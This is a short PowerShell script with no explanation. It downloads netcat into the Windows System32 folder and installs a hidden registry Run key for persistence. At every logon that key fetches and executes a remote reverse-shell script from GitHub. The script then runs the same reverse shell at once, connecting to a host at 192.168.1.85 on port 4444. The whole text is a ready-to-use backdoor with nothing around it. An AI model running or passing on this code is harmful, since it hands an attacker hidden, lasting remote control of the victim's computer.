(New-Object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip', 'C:\Temp\netcat.zip')
Expand-Archive -Path 'C:\Temp\netcat.zip' -DestinationPath 'C:\Temp\netcat' -Force
Move-Item -Path 'C:\Temp\netcat\nc.exe' -Destination 'C:\Windows\System32' -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MyCustomKey" -Value "powershell -NoProfile -WindowStyle Hidden -Command `"IEX (IWR 'https://raw.githubusercontent.com/bjrumplee/ncatreverseshell/main/reverse.ps1' -UseBasicParsing); Invoke-ConPtyShell '192.168.1.85' '4444'`"" -PropertyType "String"
powershell -NoProfile -WindowStyle Hidden -Command "IEX (IWR 'https://raw.githubusercontent.com/bjrumplee/ncatreverseshell/main/reverse.ps1' -UseBasicParsing); Invoke-ConPtyShell '192.168.1.85' '4444'"

